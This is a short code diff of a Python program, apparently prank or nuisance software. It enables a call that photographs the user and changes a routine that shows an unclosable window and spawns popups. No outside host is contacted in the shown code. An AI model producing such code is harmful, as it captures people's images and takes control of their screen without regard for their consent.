@@ -18,7 +18,7 @@ def thread_handling():
     t2 = threading.Thread(target=always_on)
 
     # Take picture of the user
-    #take_picture()
+    take_picture()
 
     t2.start()
     time.sleep(.1)
@@ -63,6 +63,7 @@ def take_picture():
 
 # Displays an image that cannot be closed and also starts a thread that prompts popups when ran, and window is closed
 def display_image_unclosable():
+    global photo
     global mood
     mood = 0
     while True:
@@ -71,11 +72,14 @@ def display_image_unclosable():
 
         top = Tk()
         top.geometry("500x400")
-        photo = PhotoImage(file="_image.png", height=500, width=500)
+        if (Path("_image.png").is_file()):
+            photo = PhotoImage(file="_image.png", height=500, width=500)
+        else:
+            photo = PhotoImage(file="default.png", height=500, width=500)
+        print(photo.name)
         label = Label(top, image = photo)
         label.pack()
         t_.start()
-        #print(mood)
         top.mainloop()
         mood+=1
         
